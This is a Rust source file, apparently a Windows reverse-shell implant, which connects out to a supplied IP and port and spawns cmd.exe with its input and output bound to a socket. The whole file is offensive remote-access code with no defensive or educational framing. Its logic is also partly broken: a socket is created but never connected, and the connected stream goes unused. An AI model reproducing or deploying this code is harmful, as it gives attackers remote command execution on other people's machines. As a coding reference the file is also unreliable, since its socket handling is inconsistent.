// Reverse  shell
use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::*;


// https://stackoverflow.com/questions/4993119/redirect-io-of-process-to-windows-socket/5725609#5725609

// https://stackoverflow.com/questions/50067355/what-methods-do-i-need-to-get-stdio-over-a-tcp-or-udp-stream-on-windows

// Windows based imports
#[cfg(windows)]
extern crate winapi;
#[cfg(windows)]
extern crate ws2_32;

#[cfg(windows)]
use std::os::windows::io::FromRawHandle;

#[cfg(windows)]
pub fn shell(ip: String, port: String) {
    // https://msdn.microsoft.com/en-us/library/windows/desktop/ms742212(v=vs.85).aspx
    let AF_INET = 2; // Ipv4
    let IPPROTO_TCP = 6; // TCP-Sock Stream
    let NULL: *mut winapi::winsock2::WSAPROTOCOL_INFOA = ptr::null_mut(); // Setup a null mutable type
    let version: u16 = 22; // Version 2.2 of winsock

    // Random shit
    let mut vendor: i8 = 10; 
    let vendorPtr: *mut i8 = &mut vendor;

    // Mutable data for startup
    let mut data: winapi::winsock2::WSADATA = winapi::winsock2::WSADATA {
        wVersion: version,
        wHighVersion: version,
        iMaxSockets: 1,
        iMaxUdpDg: 1,
        szDescription: [
            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
            126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 1,
            1, 1, 1, 1,
        ],
        szSystemStatus: [
            126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21,
            13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126,
            3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13,
            2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3,
            21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2, 126, 3, 21, 13, 2,
            126, 3, 21, 13, 2, 126, 3, 21, 13, 1, 1, 1, 1, 1,
        ],
        lpVendorInfo: vendorPtr,
    };

    // Start WSA and WinSock2
    unsafe {
        ws2_32::WSAStartup(version, &mut data);
    }

    // ET, Phone Home!
    let home = [ip, port].join(":");

    // Unwrap input
    let s = connect(home);

    // Raw Socket for windows
    unsafe {
        let socket = ws2_32::WSASocketA(AF_INET, 1, IPPROTO_TCP, NULL, 0, 0);

        println!("{}", socket);

        // let socket = socket.as_raw_socket();

        let handle: winapi::winnt::HANDLE = socket as winapi::winnt::HANDLE;
        // let handle: winapi::winnt::HANDLE = s as winapi::winnt::HANDLE;

        // Open shell
        Command::new("cmd")
            .stdin( Stdio::from_raw_handle(handle))
            .stdout( Stdio::from_raw_handle(handle))
            .stderr( Stdio::from_raw_handle(handle))
            .spawn()
            .unwrap()
            .wait()
            .unwrap();
    }
}

fn connect(home: String) -> TcpStream {
    // Unwrap input
    let s = TcpStream::connect(home).unwrap();
    return s;
}
